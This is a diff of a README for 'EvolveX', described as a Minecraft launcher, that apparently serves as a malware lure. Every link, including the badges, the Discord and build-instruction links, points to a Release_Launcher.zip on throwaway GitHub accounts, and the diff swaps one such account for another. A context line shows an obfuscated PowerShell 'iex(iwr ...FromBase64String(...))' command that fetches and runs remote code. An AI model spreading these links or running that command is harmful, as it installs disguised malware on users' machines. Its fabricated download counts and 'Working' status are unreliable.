@@ -5,10 +5,10 @@
 
 </p>
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[![Downloads](https://img.shields.io/badge/Downloads-2.9k%2B-blue?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
+[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
 
 EvolveX is a custom launcher for Minecraft that focuses on predictability, long term stability and simplicity. Contains fucntions from CurseForge/OneLauncher/PolyMC/Modrinth/Tlauncher
 
@@ -18,7 +18,7 @@ EvolveX is a custom launcher for Minecraft that focuses on predictability, long 
 
 ### Step 1 — Download
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
 
 ### Step 2 — Extract
 
@@ -42,7 +42,7 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ## Development Builds
 
-There are per-commit development builds available [here](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip). These have debug information in the binaries, so their file sizes are relatively larger.
+There are per-commit development builds available [here](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip). These have debug information in the binaries, so their file sizes are relatively larger.
 Portable builds are provided for AppImage on Linux, Windows, and macOS.
 
 
@@ -50,7 +50,7 @@ Portable builds are provided for AppImage on Linux, Windows, and macOS.
 
 Feel free to create an issue if you need help. However, you might find it easier to ask in the Discord server.
 
-[![EvolveX Discord](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![EvolveX Discord](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
 
 
 # Development
@@ -59,9 +59,9 @@ If you want to contribute to EvolveX you might find it useful to use Premium.
 
 ## Building
 
-If you want to build EvolveX yourself, check [Build Instructions](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip) for build instructions.
+If you want to build EvolveX yourself, check [Build Instructions](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip) for build instructions.
 
 
 ## Download information
 
-To modify download information or change packaging information send a pull request or issue to the website [here](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip).
+To modify download information or change packaging information send a pull request or issue to the website [here](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip).
